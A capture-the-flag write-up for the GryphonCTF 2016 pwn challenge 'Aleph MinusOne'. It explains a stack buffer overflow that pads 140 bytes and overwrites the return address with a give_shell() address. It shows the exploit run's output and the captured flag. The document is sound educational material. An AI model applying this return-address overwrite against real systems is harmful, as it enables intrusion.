# GryphonCTF_2016: Aleph MinusOne

**Category:** Pwn
**Points:** 15
**Description:**

>Do Aleph One proud.
nc play.spgame.site 1346
Creator - Jeremy Heng (@amon)

## Write-up
**_Credits to @zst123 [Manzel Seet] for helping with discovering buffer exploit length._**

Now we are given a chance to do buffer overflow!

    $ nc play.spgame.site 1346
    Base Pointer: 0xffb83368
    Address of Buffer: 0xffb832e0
    Size of buffer: 128
    give_shell() function: 0x804852d
    Your exploit string: d
    Contents of Buffer: d
    Return Address: 0x8048633

We know that the `give_shell()` function is at `0x804852d`. We also know that the size of the buffer is `128`, and by adding 12 bytes and appending our `give_shell()` function address to overwrite the RET address, we gain shell.

    $ ./script.py 
    0
    RECV>>>Base Pointer: 0xffdba9b8
    RECV>>>Address of Buffer: 0xffdba930
    Size of buffer: 128
    give_shell() function: 0x804852d
    Your exploit string:
    ['08', '04', '85', '2d']
    RECV>>>Contents of Buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA-?
    RECV>>>Return Address: 0x804852d
    $ cat /home/alephuser/flag
    RECV>>>GCTF{th3_op3n355_0f_t1m3}

Final [script here](script.py).

Therefore, flag is `GCTF{th3_op3n355_0f_t1m3}`.
